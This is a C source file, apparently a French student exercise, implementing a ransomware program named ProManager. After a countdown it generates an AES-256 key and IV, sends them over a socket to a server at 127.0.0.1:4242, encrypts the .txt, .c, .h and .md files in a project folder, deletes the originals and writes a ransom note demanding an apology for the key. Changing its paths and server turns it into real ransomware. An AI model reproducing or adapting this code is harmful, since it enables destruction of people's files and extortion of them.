#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <time.h>
#include <sys/stat.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define WATCH_PATH "TP"
#define PROJECT_PATH "TP/Projet"
#define EXTENSIONS ".txt|.c|.h|.md"
#define RANSOM_FILE "TP/Projet/RANÇON.txt"

#define DEBUG 1

int should_encrypt(const char *filename) {
    const char *ext = strrchr(filename, '.');
    return ext && (strstr(EXTENSIONS, ext) != NULL);
}

void encrypt_file(const char *filepath, const unsigned char *key, const unsigned char *iv) {
    FILE *in = fopen(filepath, "rb");
    if (!in) return;

    char outpath[512];
    snprintf(outpath, sizeof(outpath), "%s.enc", filepath);
    FILE *out = fopen(outpath, "wb");
    if (!out) { fclose(in); return; }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

    unsigned char inbuf[1024], outbuf[1040];
    int inlen, outlen;
    while ((inlen = fread(inbuf, 1, 1024, in)) > 0) {
        EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, inlen);
        fwrite(outbuf, 1, outlen, out);
    }
    EVP_EncryptFinal_ex(ctx, outbuf, &outlen);
    fwrite(outbuf, 1, outlen, out);

    EVP_CIPHER_CTX_free(ctx);
    fclose(in);
    fclose(out);
    remove(filepath);
}
void send_key_to_server(const unsigned char *key, const unsigned char *iv) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    struct sockaddr_in serv_addr = {0};
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(4242);
    inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Connexion serveur pardon échouée");
        close(sock);
        return;
    }

    write(sock, "KEY", 3);
    write(sock, key, 32);
    write(sock, iv, 16);

    close(sock);
}

int main() {
    printf("Démarrage de la surveillance...\n");
    time_t start = 0;
    int countdown_started = 0;

    while (1) {
        DIR *dir = opendir(WATCH_PATH);
        struct dirent *entry;
        int found = 0;
        while ((entry = readdir(dir))) {
            if (strcmp(entry->d_name, "Projet") == 0) {
                found = 1;
                break;
            }
        }
        closedir(dir);

        if (found && !countdown_started) {
            start = time(NULL);
            countdown_started = 1;
            printf("Dossier Projet détecté. Décompte lancé.\n");
        }
        int compteur ;
        if(DEBUG == 1){
            compteur = 30;
        }
        else {
            compteur = 60*60;
        }

        if (countdown_started && difftime(time(NULL), start) >= compteur) { // 30s pour test
            printf("Temps écoulé. Chiffrement en cours...\n");
            unsigned char key[32], iv[16];
            RAND_bytes(key, 32);
            RAND_bytes(iv, 16);
            send_key_to_server(key, iv);

            //FILE *kf = fopen("key.bin", "wb"); fwrite(key, 1, 32, kf); fclose(kf);
            //FILE *ivf = fopen("iv.bin", "wb"); fwrite(iv, 1, 16, ivf); fclose(ivf);

            DIR *pdir = opendir(PROJECT_PATH);
            while ((entry = readdir(pdir))) {
                if (entry->d_type == DT_REG && should_encrypt(entry->d_name)) {
                    char filepath[512];
                    snprintf(filepath, sizeof(filepath), "%s/%s", PROJECT_PATH, entry->d_name);
                    encrypt_file(filepath, key, iv);
                }
            }
            closedir(pdir);

            FILE *r = fopen(RANSOM_FILE, "w");
            fprintf(r,
                "#########################################\n"
                "#        ❌  FICHIERS CHIFFRÉS  ❌       #\n"
                "#########################################\n\n"
                "Vos fichiers dans ce dossier ont été chiffrés par ProManager,\n"
                "car la date limite de remise du projet a été dépassée.\n\n"
                "Chaque fichier a été chiffré en AES-256 avec une clé unique.\n"
                "Ne tentez pas de modifier les fichiers `.enc`.\n\n"
                "✅ Pour récupérer vos fichiers :\n"
                "1. Lancez `client_decrypt`.\n"
                "2. Connectez-vous à 127.0.0.1:4242\n"
                "3. Rédigez des excuses (min 20 caractères).\n"
                "4. Si acceptées : clé + IV envoyés.\n\n");
            fclose(r);
            break;
        }
        sleep(5);
    }
    return 0;
}
